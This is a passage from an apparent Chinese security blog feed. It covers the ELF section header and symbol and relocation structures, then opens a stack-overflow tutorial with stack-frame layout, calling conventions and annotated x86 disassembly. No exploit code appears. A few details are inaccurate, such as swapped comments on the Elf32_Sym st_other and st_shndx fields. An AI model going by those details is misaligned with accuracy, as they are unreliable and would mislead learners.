-S</code>命令执行的结果省略了该前缀。节区类型定义如表：</p><table><thead><tr><th>名称</th><th>取值</th><th>说明</th></tr></thead><tbody><tr><td>SHT_NULL</td><td>0</td><td>此值标志节区头部是非活动的，没有对应的节区。（无效节）</td></tr><tr><td>SHT_PROGBITS</td><td>1</td><td><strong>程序节</strong>。此节区包含程序定义的信息，其格式和含义都有程序来解释，代码节、数据节都是这种类型</td></tr><tr><td>SHT_SYMTAB</td><td>2</td><td>此节区包含一个<strong>符号表</strong>。目前目标文件对每种类型的节区都只能包含一个，不过这个限制将来可能会发生变化。一般，SHT_SYMTAB节区提供用于链接编辑（指ld而言）的符号，尽管也可用来实现动态链接</td></tr><tr><td>SHT_STRTAB</td><td>3</td><td>此节区包含<strong>字符串表</strong>。目标文件可能包含多个字符串表节区</td></tr><tr><td>SHT_RELA</td><td>4</td><td>此节区包含<strong>重定位表项</strong>，其中可能会有补齐内容（addend），例如32位目标文件中的Elf32_Rela类型。目标文件可能拥有多个重定位节区</td></tr><tr><td>SHT_HASH</td><td>5</td><td>此节区包含<strong>符号哈希表</strong>。所有参与动态链接的目标都必须包含一个符号哈希表。目前，一个目标文件只能包含一个哈希表，不过此限制将来可能会解除</td></tr><tr><td>SHT_DYNAMIC</td><td>6</td><td>此节区包含动态链接的信息。目前一个目标文件中只能包含一个动态节区，将来可能会取消这一限制</td></tr><tr><td>SHT_NOTE</td><td>7</td><td>此节区包含以某种方式来标记文件的信息，即提示信息</td></tr><tr><td>SHT_NOBITS</td><td>8</td><td>表示该节在文件中没有内容，如<code>.bss</code>节。这种类型的节区不占用文件中的空间，其他方面和<code>SHT_PROGBITS</code>相似。尽管此节区不包含任何字节，成员<code>sh_offset</code>中还是会包含概念性的文件偏移</td></tr><tr><td>SHT_REL</td><td>9</td><td>此节区包含重定位表项，其中没有补齐（addends），例如32位目标文件中的Elf32_rel类型。目标文件中可以拥有多个重定位节区</td></tr><tr><td>SHT_SHLIB</td><td>10</td><td>此节区被保留，不过其语义是未规定的。包含此类型节区的程序与ABI不兼容</td></tr><tr><td>SHT_DYNSYM</td><td>11</td><td><strong>动态链接的符号表</strong>。作为一个完整的符号表，它可能包含很多对动态链接而言不必要的符号。因此，目标文件也可以包含一个SHT_DYNSYM节区，其中保存动态链接符号的一个最小集合，以节省空间</td></tr><tr><td>SHT_LOPROC</td><td>0x70000000</td><td>这一段（包含两个边界），是保留给处理器专用语义的</td></tr><tr><td>SHT_HIPROC</td><td>0x7FFFFFFF</td><td>这一段（包含两个边界），是保留给处理器专用语义的</td></tr><tr><td>SHT_LOUSER</td><td>0x80000000</td><td>此值给出保留给应用程序的索引下界</td></tr><tr><td>SHT_HIUSER</td><td>0x8FFFFFFF</td><td>此值给出保留给应用程序的索引上界</td></tr></tbody></table><hr><h5 id="sh-flags"><a href="#sh-flags" class="headerlink" title="sh_flags"></a>sh_flags</h5><p>sh_flags字段定义了一个节区中包含的内容是否可以修改、是否可以执行等消息。如果一个标志位被设置，则该位取值为1。未定义的各位都设置为0。</p><table><thead><tr><th>名称</th><th>取值</th><th>含义</th></tr></thead><tbody><tr><td>SHF_WRITE</td><td>0x1</td><td>表示该节在进程空间中可写</td></tr><tr><td>SHF_ALLOC</td><td>0x2</td><td>表示该节在进程空间中需要分配空间。有些包含指示或控制信息的节不需要在进程空间中分配空间，就不会有这个标志。</td></tr><tr><td>SHF_EXECINSTR</td><td>0x4</td><td>表示该节在进程空间中可以被执行</td></tr><tr><td>SHF_MASKPROC</td><td>0xF0000000</td><td></td></tr></tbody></table><p>其中已经定义了的各位含义如下：</p><ul><li>SHF_WRITE：节区包含进程执行过程中将可写的数据</li><li>SHF_ALLOC：此节区在进程执行中占用内存。某些控制节区并不出现于目标文件的内存映像中，对于那些节区，此位应设置为0</li><li>SHF_EXECINSTR：节区包含可执行的机器指令</li><li>SHF_MASKPROC：所有包含于此掩码中的四位都用于处理器专用的语义</li></ul><hr><h5 id="sh-link和sh-info"><a href="#sh-link和sh-info" class="headerlink" title="sh_link和sh_info"></a>sh_link和sh_info</h5><p>如果节的类型是与链接有关的（无论是动态链接还是静态链接），如<strong>重定位表、符号表</strong>等，则<code>sh_link</code>、<code>sh_info</code>两个成员所包含的意义如下所示。其它类型的节中这两个成员没有意义。</p><p>根据节区类型的不同，sh_link和sh_info的具体含义也有所不同：</p><p><img src="http://cdn.peckerwood.top/3-4-1.png" alt="png"></p><hr><h3 id="ELF-Sections"><a href="#ELF-Sections" class="headerlink" title="ELF Sections"></a>ELF Sections</h3><h4 id="节的分类"><a href="#节的分类" class="headerlink" title="节的分类"></a>节的分类</h4><p><strong>.text</strong></p><p><code>.text</code>节是保存了程序代码指令的代码节。一段可执行程序，如果存在Phdr，则<code>.text</code>节就会存在于<code>text</code>段中。由于<code>.text</code>节保存了程序代码，所以节类型为<code>SHT_PROGBITS</code>。</p><p><strong>.rodata</strong></p><p><code>.rodata</code>节保存了只读的数据，如一行c语言代码中的字符串。由于<code>.rodata</code>节是只读的，所以只能存在于一个可执行文件的<strong>只读段</strong>中。因此，只能在<code>text</code>段（而不是<code>data</code>段）中找到<code>.rodata</code>节。由于<code>.rodata</code>节是只读的，所以节类型为<code>SHT_PROGBITS</code>。</p><p><strong>.plt</strong></p><p><code>.plt</code>节也称为<strong>过程链接表（Procedure Linkage Table）</strong>，其包含了动态链接器调用从共享库导入的函数所必需的相关代码。由于<code>.plt</code>节保存了代码，所以节类型为<code>SHT_PROGBITS</code>。</p><p><strong>.data</strong></p><p><code>.data</code>节存在于<code>data</code>段中，<strong>其保存了初始化的全局变量等数据</strong>。由于<code>.data</code>节保存了程序的变量数据，所以节类型为<code>SHT_PROGBITS</code>。</p><p><strong>.bss</strong></p><p><code>.bss</code>节存在于<code>data</code>段中，占用空间不超过4字节，仅表示这个节本来的空间。<code>.bss</code>节保存了未进行初始化的全局数据。程序加载时数据被初始化为0，在程序执行期间可以进行赋值。由于<code>.bss</code>节未保存实际的数据，所以节类型为<code>SHT_NOBITS</code>。</p><p><strong>.got.plt</strong></p><p><code>.got</code>节保存了全局偏移量。<code>.got</code>节和<code>.plt</code>节一起提供了对导入的共享库函数的访问入口，由动态链接器在运行时进行修改。由于<code>.got .plt</code>节与程序执行有关，所以节类型为<code>SHT_PROGBITS</code>。</p><p><strong>.dynsym</strong></p><p><code>.dynsym</code>节保存在<code>text</code>段中。其保存了从共享库导入的动态符号表。节类型为<code>SHT_DYNSYM</code>。</p><p><strong>.dynstr</strong></p><p><code>.dynstr</code>保存了动态链接字符串表，表中存放了一系列字符串，这些字符串代表了符号名称，以空字符作为终止符。</p><p><strong>.rel.name .relaname</strong></p><p>name根据重定位所适用的节区给定。例如<code>.text</code>节区的重定位节区名字将是：<code>.rel.text</code>或者<code>.rela.text</code>。重定位表保存了重定位相关的信息，这些信息描述了如何在链接或运行时，对ELF目标文件的某些部分或者进程镜像进行补充或者修改。由于重定位表保存了重定位相关的数据，所以节类型为<code>SHT_REL</code>。</p><p><strong>.hash</strong></p><p><code>.hash</code>节也称为<code>.gnu.hash</code>，其保存了一个用于查找符号的散列表。</p><p><strong>.symtab</strong></p><p><code>.symtab</code>节是一个<code>ElfN_Sym</code>的数组，保存了符号信息。节类型为<code>SHT_SYMTAB</code>。</p><p><strong>.strtab</strong></p><p><code>.strtab</code>节保存的是符号字符串表，表中的内容会被<code>.symtab</code>的<code>ElfN_Sym</code>结构中的<code>st_name</code>引用。节类型为<code>SHT_STRTAB</code>。</p><p><strong>.ctors&amp;.dtors</strong></p><p><code>ctors</code>（构造器）节和<code>.dtors</code>（析构器）节分别保存了指向构造函数和析构函数的函数指针，构造函数是在main函数执行之前需要执行的代码；析构函数是在main函数之后需要执行的代码。</p><p>我们可以使用readelf工具来查看节头表。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br></pre></td><td class="code"><pre><span class="line">ascotbe@ubuntu:~$ readelf -S /bin/sh</span><br><span class="line">There are 30 section headers, starting at offset 0x1f398:</span><br><span class="line"></span><br><span class="line">Section Headers:</span><br><span class="line">  [Nr] Name              Type             Address           Offset</span><br><span class="line">       Size              EntSize          Flags  Link  Info  Align</span><br><span class="line">  [ 0]                   NULL             0000000000000000  00000000</span><br><span class="line">       0000000000000000  0000000000000000           0     0     0</span><br><span class="line">  [ 1] .interp           PROGBITS         0000000000000318  00000318</span><br><span class="line">       000000000000001c  0000000000000000   A       0     0     1</span><br><span class="line">  [ 2] .note.gnu.propert NOTE             0000000000000338  00000338</span><br><span class="line">       0000000000000020  0000000000000000   A       0     0     8</span><br><span class="line">  [ 3] .note.gnu.build-i NOTE             0000000000000358  00000358</span><br><span class="line">       0000000000000024  0000000000000000   A       0     0     4</span><br><span class="line">  [ 4] .note.ABI-tag     NOTE             000000000000037c  0000037c</span><br><span class="line">       0000000000000020  0000000000000000   A       0     0     4</span><br><span class="line">  [ 5] .gnu.hash         GNU_HASH         00000000000003a0  000003a0</span><br><span class="line">       00000000000002d8  0000000000000000   A       6     0     8</span><br><span class="line">  [ 6] .dynsym           DYNSYM           0000000000000678  00000678</span><br><span class="line">       0000000000001158  0000000000000018   A       7     1     8</span><br><span class="line">  [ 7] .dynstr           STRTAB           00000000000017d0  000017d0</span><br><span class="line">       00000000000006b6  0000000000000000   A       0     0     1</span><br><span class="line">  [ 8] .gnu.version      VERSYM           0000000000001e86  00001e86</span><br><span class="line">       0000000000000172  0000000000000002   A       6     0     2</span><br><span class="line">  [ 9] .gnu.version_r    VERNEED          0000000000001ff8  00001ff8</span><br><span class="line">       0000000000000070  0000000000000000   A       7     1     8</span><br><span class="line">  [10] .rela.dyn         RELA             0000000000002068  00002068</span><br><span class="line">       0000000000001b00  0000000000000018   A       6     0     8</span><br><span class="line">  [11] .rela.plt         RELA             0000000000003b68  00003b68</span><br><span class="line">       00000000000007f8  0000000000000018  AI       6    25     8</span><br><span class="line">  [12] .init             PROGBITS         0000000000005000  00005000</span><br><span class="line">       000000000000001b  0000000000000000  AX       0     0     4</span><br><span class="line">  [13] .plt              PROGBITS         0000000000005020  00005020</span><br><span class="line">       0000000000000560  0000000000000010  AX       0     0     16</span><br><span class="line">  [14] .plt.got          PROGBITS         0000000000005580  00005580</span><br><span class="line">       0000000000000020  0000000000000010  AX       0     0     16</span><br><span class="line">  [15] .plt.sec          PROGBITS         00000000000055a0  000055a0</span><br><span class="line">       0000000000000550  0000000000000010  AX       0     0     16</span><br><span class="line">  [16] .text             PROGBITS         0000000000005af0  00005af0</span><br><span class="line">       0000000000011cf5  0000000000000000  AX       0     0     16</span><br><span class="line">  [17] .fini             PROGBITS         00000000000177e8  000177e8</span><br><span class="line">       000000000000000d  0000000000000000  AX       0     0     4</span><br><span class="line">  [18] .rodata           PROGBITS         0000000000018000  00018000</span><br><span class="line">       0000000000001f42  0000000000000000   A       0     0     32</span><br><span class="line">  [19] .eh_frame_hdr     PROGBITS         0000000000019f44  00019f44</span><br><span class="line">       0000000000000804  0000000000000000   A       0     0     4</span><br><span class="line">  [20] .eh_frame         PROGBITS         000000000001a748  0001a748</span><br><span class="line">       00000000000031a8  0000000000000000   A       0     0     8</span><br><span class="line">  [21] .init_array       INIT_ARRAY       000000000001ef30  0001df30</span><br><span class="line">       0000000000000008  0000000000000008  WA       0     0     8</span><br><span class="line">  [22] .fini_array       FINI_ARRAY       000000000001ef38  0001df38</span><br><span class="line">       0000000000000008  0000000000000008  WA       0     0     8</span><br><span class="line">  [23] .data.rel.ro      PROGBITS         000000000001ef40  0001df40</span><br><span class="line">       0000000000000bc8  0000000000000000  WA       0     0     32</span><br><span class="line">  [24] .dynamic          DYNAMIC          000000000001fb08  0001eb08</span><br><span class="line">       00000000000001f0  0000000000000010  WA       7     0     8</span><br><span class="line">  [25] .got              PROGBITS         000000000001fcf8  0001ecf8</span><br><span class="line">       00000000000002f0  0000000000000008  WA       0     0     8</span><br><span class="line">  [26] .data             PROGBITS         0000000000020000  0001f000</span><br><span class="line">       0000000000000240  0000000000000000  WA       0     0     32</span><br><span class="line">  [27] .bss              NOBITS           0000000000020240  0001f240</span><br><span class="line">       0000000000002c30  0000000000000000  WA       0     0     32</span><br><span class="line">  [28] .gnu_debuglink    PROGBITS         0000000000000000  0001f240</span><br><span class="line">       0000000000000034  0000000000000000           0     0     4</span><br><span class="line">  [29] .shstrtab         STRTAB           0000000000000000  0001f274</span><br><span class="line">       000000000000011d  0000000000000000           0     0     1</span><br><span class="line">Key to Flags:</span><br><span class="line">  W (write), A (alloc), X (execute), M (merge), S (strings), I (info),</span><br><span class="line">  L (link order), O (extra OS processing required), G (group), T (TLS),</span><br><span class="line">  C (compressed), x (unknown), o (OS specific), E (exclude),</span><br><span class="line">  l (large), p (processor specific)</span><br></pre></td></tr></table></figure><h4 id="符号表"><a href="#符号表" class="headerlink" title="符号表"></a>符号表</h4><p>节的分类中我们介绍了<code>.dynsym</code>节和<code>.symtab</code>节，两者都是符号表。那么它们到底有什么区别呢？存在什么关系呢？</p><p><strong>符号是对某些类型的数据或代码（如全局变量或函数）的符号引用，函数名或变量名就是符号名</strong>。例如，<code>printf()</code>函数会在动态链接符号表<code>.dynsym</code>中存有一个指向该函数的符号项（以<code>Elf_Sym</code>数据结构表示）。在大多数共享库和动态链接可执行文件中，存在两个符号表。即<code>.dynsym</code>和<code>.symtab</code>。</p><p><strong><code>.dynsym</code>保存了引用来自外部文件符号的全局符号</strong>。如<code>printf</code>库函数。**<code>.dynsym</code>保存的符号是<code>.symtab</code>所保存符合的子集，<code>.symtab</code>中还保存了可执行文件的本地符号**。如全局变量，代码中定义的本地函数等。</p><p>既然<code>.dynsym</code>是<code>.symtab</code>的子集，那为何要同时存在两个符号表呢？</p><p>通过<code>readelf -S</code>命令可以查看可执行文件的输出，一部分节标志位（<code>sh_flags</code>）被标记为了<strong>A（ALLOC）、WA（WRITE/ALLOC）、AX（ALLOC/EXEC）</strong>。其中，<code>.dynsym</code>被标记为ALLOC，而<code>.symtab</code>则没有标记。</p><p>ALLOC表示有该标记的节会在运行时分配并装载进入内存，而<code>.symtab</code>不是在运行时必需的，因此不会被装载到内存中。**<code>.dynsym</code>保存的符号只能在运行时被解析，因此是运行时动态链接器所需的唯一符号**。<code>.dynsym</code>对于动态链接可执行文件的执行是必需的，而<code>.symtab</code>只是用来进行调试和链接的。</p><p><img src="https://github.com/Ascotbe/Random-img/blob/master/ELF/5.png?raw=true" alt="img"></p><p>上图所示为通过符号表索引字符串表的示意图。符号表中的每一项都是一个<code>Elf_Sym</code>结构，对应可以在字符串表中索引得到一个字符串。该数据结构符号表项的格式如下：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> &#123;</span></span><br><span class="line">    Elf32_Word st_name;     <span class="comment">//符号名。该值为该符号名在字符串表中的偏移地址。</span></span><br><span class="line">    Elf32_Addr st_value;    <span class="comment">//符号对应的值。存放符号的值（可能是地址或位置偏移量）。</span></span><br><span class="line">    Elf32_Word st_size;     <span class="comment">//符号的大小。</span></span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">char</span> st_info;  <span class="comment">//此成员给出符号的类型和绑定属性。下面给出若干取值和含义的绑定关系</span></span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">char</span> st_other; <span class="comment">//符号所在的节</span></span><br><span class="line">    Elf32_Half st_shndx;    <span class="comment">//符号类型及绑定属性</span></span><br><span class="line">&#125; Elf32_sym;</span><br></pre></td></tr></table></figure><h4 id="字符串表"><a href="#字符串表" class="headerlink" title="字符串表"></a>字符串表</h4><p>类似于符号表，在大多数共享库和动态链接可执行文件中，也存在两个字符串表。即<code>.dynstr</code>和<code>.strtab</code>，分别对应于<code>.dynsym</code>和<code>symtab</code>。此外，还有一个<code>.shstrtab</code>的节头字符串表，用于保存节头表中用到的字符串，可通过<code>sh_name</code>进行索引。</p><p>ELF文件中所有字符表的结构基本一致，如上图所示。</p><h4 id="重定位表"><a href="#重定位表" class="headerlink" title="重定位表"></a>重定位表</h4><p><strong>重定位就是将符号定义和符号引用进行连接的过程</strong>。可重定位文件需要包含描述如何修改节内容的相关信息，从而使可执行文件和共享目标文件能够保存进程的程序镜像所需要的正确信息。</p><p>重定位表是进行重定位的重要依据。我们可以使用objdump工具查看目标文件的重定位表：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> &#123;</span></span><br><span class="line">    Elf32_Addr r_offset;  <span class="comment">//重定位入口的偏移。</span></span><br><span class="line">                          <span class="comment">//对于可重定位文件来说，这个值是该重定位入口所要修正的位置的第一个字节相对于节起始的偏移</span></span><br><span class="line">                          <span class="comment">//对于可执行文件或共享对象文件来说，这个值是该重定位入口所要修正的位置的第一个字节的虚拟地址</span></span><br><span class="line">    Elf32_word r_info;    <span class="comment">//重定位入口的类型和符号</span></span><br><span class="line">                          <span class="comment">//对于可执行文件和共享目标文件来说，它们的重定位入口是动态链接类型的。</span></span><br><span class="line">&#125; Elf32_Rel;</span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> &#123;</span></span><br><span class="line">    Elf32_Addr r_offset;</span><br><span class="line">    Elf32_Word r_info;</span><br><span class="line">    Elf32_Word r_addend;  <span class="comment">//此成员给出一个常量补齐，用来计算将被填充到可重定位字段的数值。</span></span><br><span class="line">&#125; Elf32_Rela;</span><br></pre></td></tr></table></figure><blockquote><h2 id="参考文章"><a href="#参考文章" class="headerlink" title="参考文章"></a>参考文章</h2></blockquote><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;www.chuquan.me&#x2F;2018&#x2F;05&#x2F;21&#x2F;elf-introduce&#x2F;</span><br><span class="line">https:&#x2F;&#x2F;paper.seebug.org&#x2F;papers&#x2F;Archive&#x2F;refs&#x2F;elf&#x2F;Understanding_ELF.pdf</span><br></pre></td></tr></table></figure>]]></content>
    
    
      
      
        
        
    <summary type="html"></summary>
        
      
    
    
    
    
  </entry>
  
  <entry>
    <title>栈溢出总结（0x02）</title>
    <link href="https://www.ascotbe.com/2020/11/20/StackOverflow_0x02/"/>
    <id>https://www.ascotbe.com/2020/11/20/StackOverflow_0x02/</id>
    <published>2020-11-20T10:45:42.000Z</published>
    <updated>2021-05-04T06:03:28.063Z</updated>
    
    <content type="html"><![CDATA[<blockquote><p>声明</p></blockquote><p>郑重声明：文中所涉及的技术、思路和工具仅供以安全为目的的学习交流使用，任何人不得将其用于非法用途以及盈利等目的，否则后果自行承担！</p><blockquote><p>前言</p></blockquote><p>在上篇中介绍了一些常见保护，以及如何开关，还有如何生成shellcode等操作，就那么点东西我搞了一星期，真是菜吐了，心态崩了了</p><img src="https://github.com/Ascotbe/Random-img/blob/master/StackOverflow/11.png?raw=true" alt="222" style="zoom:50%;" /><blockquote><h2 id="写在前面的几个笔记"><a href="#写在前面的几个笔记" class="headerlink" title="写在前面的几个笔记"></a>写在前面的几个笔记</h2></blockquote><blockquote><h4 id="CALL和RET指令解释"><a href="#CALL和RET指令解释" class="headerlink" title="CALL和RET指令解释"></a>CALL和RET指令解释</h4></blockquote><ul><li><strong>CALL</strong>指令调用某个子函数时，下一条指令的地址作为返回地址被保存到栈中。等价于<strong>PUSH</strong>返回地址与<strong>JMP</strong>函数地址的指令序列</li><li><strong>RET</strong>指令跳转到<strong>CALL</strong>指令保存的返回地址，讲控制权交还给调用函数。等价于<strong>POP</strong>返回地址与<strong>JMP</strong>返回地址的指令序列</li></ul><blockquote><h4 id="AMD64和i386的区别"><a href="#AMD64和i386的区别" class="headerlink" title="AMD64和i386的区别"></a>AMD64和i386的区别</h4></blockquote><p>由于后面的利用方式可能会用到64位的程序，所以在前面把两者几个点需要区别下</p><ul><li>首先是内存地址的范围由32位变成了64位。但是可以使用的内存地址不能大于<code>0x00007fffffffffff</code>，否则就会抛出异常。</li><li>其次是函数参数的传递方式发生了改变，x86中参数都是保存在栈上，但在x64中的前六个参数依次保存在<strong>RDI</strong>、<strong>RSI</strong>、<strong>RDX</strong>、<strong>RCX</strong>、 <strong>R8</strong>和<strong>R9</strong>中，如果还有更多的参数的话才会保存在栈上。</li></ul><blockquote><h2 id="函数调用栈"><a href="#函数调用栈" class="headerlink" title="函数调用栈"></a>函数调用栈</h2></blockquote><p>函数调用栈是一块连续的用来保存函数运行状态的内存区域，调用函数（caller）和被调用函数 （callee）根据调用关系堆叠起来，从内存的高地址向低地址增长。</p><p>一个典型的栈帧布局如下所示:</p><ol><li>函数参数</li><li>函数返回地址</li><li>帧指针</li><li>错误处理帧</li><li>局部变量</li><li>栈缓冲区</li><li>被调函数保存的寄存器</li></ol><p>栈帧的布局如下图所示：</p><p><img src="https://github.com/Ascotbe/Random-img/blob/master/StackOverflow/24.png?raw=true" alt="img"></p><p>在windows/Intel平台上，当发生一个函数调用时，数据通过如下的方式存放在栈上：</p><ol><li>在函数调用之前先将函数参数压栈，参数按照从<strong>右</strong>到<strong>左</strong>的顺序。</li><li>由x86的<strong>call</strong>指令将函数的返回地址压栈（<strong>通常为call命令的下一个地址</strong>），这个返回地址就是函数调用结束后<strong>ret</strong>指令放入EIP寄存器的值。</li><li>上一个栈帧的栈帧指针通过EBP的值压栈</li><li>如果函数包含了try/catch或者其他的异常处理结构（如SEH），编译器会在栈上放置异常处理所需要的信息。</li><li>栈上分配局部变量</li><li>为临时数据分配栈缓冲区</li><li>最后，被调函数保存ESI, EDI, EBX寄存器的值。 对于linux/intel平台，这一步在第4步之后</li></ol><blockquote><h4 id="样例"><a href="#样例" class="headerlink" title="样例"></a>样例</h4></blockquote><p>演示代码</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">func</span><span class="params">(<span class="keyword">int</span> arg1, <span class="keyword">int</span> arg2, <span class="keyword">int</span> arg3, <span class="keyword">int</span> arg4, <span class="keyword">int</span> arg5, <span class="keyword">int</span> arg6, <span class="keyword">int</span> arg7, <span class="keyword">int</span> arg8)</span></span></span><br><span class="line"><span class="function"></span>&#123; </span><br><span class="line">    <span class="keyword">int</span> loc1 = arg1 + <span class="number">1</span>; <span class="keyword">int</span> loc8 = arg8 + <span class="number">8</span>; <span class="keyword">return</span> loc1 + loc8; </span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span></span><br><span class="line"><span class="function"></span>&#123; </span><br><span class="line"><span class="keyword">return</span> func(<span class="number">11</span>, <span class="number">22</span>, <span class="number">33</span>, <span class="number">44</span>, <span class="number">55</span>, <span class="number">66</span>, <span class="number">77</span>, <span class="number">88</span>); </span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// gcc -m32 stack.c -o stack32</span></span><br><span class="line"><span class="comment">// gcc stack.c -o stack64</span></span><br></pre></td></tr></table></figure><blockquote><h4 id="栈的分布图"><a href="#栈的分布图" class="headerlink" title="栈的分布图"></a>栈的分布图</h4></blockquote><p><img src="https://github.com/Ascotbe/Random-img/blob/master/StackOverflow/25.png?raw=true" alt="image-20210314150418220"></p><blockquote><h4 id="x86"><a href="#x86" class="headerlink" title="x86"></a>x86</h4></blockquote><p>首先，被调用函数 func()的 8 个参数从后向前依次入栈，当执行 call 指令时，下一条指令的地址0x08048415 作为返回地址入栈。然后程序跳转到 func()，在函数开头，将调用函数的 ebp 压栈保存并更新为当前的栈顶地址esp作为新的栈基址，而 esp 则下移为局部变量开辟空间。函数返回时则相反，通过 leave 指令将 esp 恢复为当前的ebp，并从栈中将调用者的 ebp 弹出，最后 ret 指令弹出返回地址作为 eip，程序回到 main()函数中，最后抬高esp 清理被调用者的参数，一次函数调用的过程就结束了。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line">#X86中的栈</span><br><span class="line">gef➤ disassemble main 0x080483fd &lt;+0&gt;: push ebp                   # 将栈底 ebp 压栈 (esp -&#x3D; 4) </span><br><span class="line">0x080483fe &lt;+1&gt;: mov ebp,esp                                      # 更新 ebp 为当前栈顶 esp </span><br><span class="line">0x08048400 &lt;+3&gt;: push 0x58                                        # 将 arg8 压栈 (esp -&#x3D; 4) </span><br><span class="line">0x08048402 &lt;+5&gt;: push 0x4d                                        # 将 arg7 压栈 (esp -&#x3D; 4) </span><br><span class="line">0x08048404 &lt;+7&gt;: push 0x42                                        # 将 arg6 压栈 (esp -&#x3D; 4) </span><br><span class="line">0x08048406 &lt;+9&gt;: push 0x37                                        # 将 arg5 压栈 (esp -&#x3D; 4) </span><br><span class="line">0x08048408 &lt;+11&gt;:push 0x2c                                        # 将 arg4 压栈 (esp -&#x3D; 4) </span><br><span class="line">0x0804840a &lt;+13&gt;:push 0x21                                        # 将 arg3 压栈 (esp -&#x3D; 4) </span><br><span class="line">0x0804840c &lt;+15&gt;:push 0x16                                        # 将 arg2 压栈 (esp -&#x3D; 4) </span><br><span class="line">0x0804840e &lt;+17&gt;:push 0xb                                         # 将 arg1 压栈 (esp -&#x3D; 4) </span><br><span class="line">0x08048410 &lt;+19&gt;:call 0x80483db &lt;func&gt;                            # 调用 func (push 0x08048415) </span><br><span class="line">0x08048415 &lt;+24&gt;:add esp,0x20                                     # 恢复栈顶 esp </span><br><span class="line">0x08048418 &lt;+27&gt;:leave                                            # (mov esp, ebp; pop ebp) </span><br><span class="line">0x08048419 &lt;+28&gt;:ret                                              # 函数返回 (pop eip) </span><br><span class="line">gef➤ disassemble func 0x080483db &lt;+0&gt;: push ebp                   # 将栈底 ebp 压栈 (esp -&#x3D; 4) </span><br><span class="line">0x080483dc &lt;+1&gt;: mov ebp,esp                                      # 更新 ebp 为当前栈顶 esp </span><br><span class="line">0x080483de &lt;+3&gt;: sub esp,0x10                                     # 为局部变量开辟栈空间 </span><br><span class="line">0x080483e1 &lt;+6&gt;: mov eax,DWORD PTR [ebp+0x8]                      # 取出 arg1 </span><br><span class="line">0x080483e4 &lt;+9&gt;: add eax,0x1                                      # 计算 loc1 </span><br><span class="line">0x080483e7 &lt;+12&gt;:mov DWORD PTR [ebp-0x8],eax                      # loc1 放入栈 </span><br><span class="line">0x080483ea &lt;+15&gt;:mov eax,DWORD PTR [ebp+0x24]                     # 取出 arg8 </span><br><span class="line">0x080483ed &lt;+18&gt;:add eax,0x8                                      # 计算 loc8 </span><br><span class="line">0x080483f0 &lt;+21&gt;:mov DWORD PTR [ebp-0x4],eax                      # loc8 放入栈 </span><br><span class="line">0x080483f3 &lt;+24&gt;:mov edx,DWORD PTR [ebp-0x8] </span><br><span class="line">0x080483f6 &lt;+27&gt;:mov eax,DWORD PTR [ebp-0x4] </span><br><span class="line">0x080483f9 &lt;+30&gt;:add eax,edx               